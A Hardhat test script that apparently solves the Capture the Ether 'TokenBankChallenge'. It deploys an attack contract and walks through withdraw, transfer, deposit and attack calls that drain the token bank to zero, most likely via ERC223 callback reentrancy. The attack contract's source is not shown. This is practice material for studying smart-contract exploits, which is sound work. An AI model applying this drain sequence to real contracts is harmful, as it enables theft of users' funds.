import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attackContract : Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
    attackContract = await (
      await ethers.getContractFactory('AttackTokenBankChallenge', deployer)
    ).deploy(target.address);
    await attackContract.deployed();
    attackContract = await attackContract.connect(attacker);
  });

  it('exploit', async () => {
    //Deploy attack contract instance with attacker
    attackContract = await attackContract.connect(attacker);
    console.log(await token.balanceOf(target.address));
    console.log("My tokens before withdraw: ", await token.balanceOf(attacker.address));
    //Withdraw my tokens
    let withdrawMyTokensTx = await target.withdraw(utils.parseUnits("500000", 18));
    await withdrawMyTokensTx.wait();
    console.log("My tokens after withdraw: ", await token.balanceOf(attacker.address));
    console.log("Tokens bank owns: ", await token.balanceOf(target.address));
    console.log("AttackContract token balance: ", await token.balanceOf(attackContract.address));
    expect (await token.balanceOf(attacker.address)).to.equal(utils.parseUnits("500000", 18));
    //Transfer my tokens to attacker contract
    let transferTx = await token["transfer(address,uint256)"](attackContract.address, utils.parseUnits("500000", 18));
    await transferTx.wait();
    console.log("AttackContract token balance: ", await token.balanceOf(attackContract.address));
    expect (await token.balanceOf(attackContract.address)).to.equal(utils.parseUnits("500000", 18));

    let depositTx = await attackContract.deposit();
    await depositTx.wait();
    console.log("Tokens bank owns after attack: ", await token.balanceOf(target.address));
    console.log("Tokens attackContract owns after attack: ", await token.balanceOf(attackContract.address));

    let attackTx = await attackContract.attack();
    await attackTx.wait();
    console.log("Tokens bank owns after last withdraw: ", await token.balanceOf(target.address));
    console.log("Tokens attackContract owns after last withdraw: ", await token.balanceOf(attackContract.address));
    let withdrawTx = await attackContract.transfer();
    await withdrawTx.wait();
    console.log("My tokens at the end: ", await token.balanceOf(attacker.address))
    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});
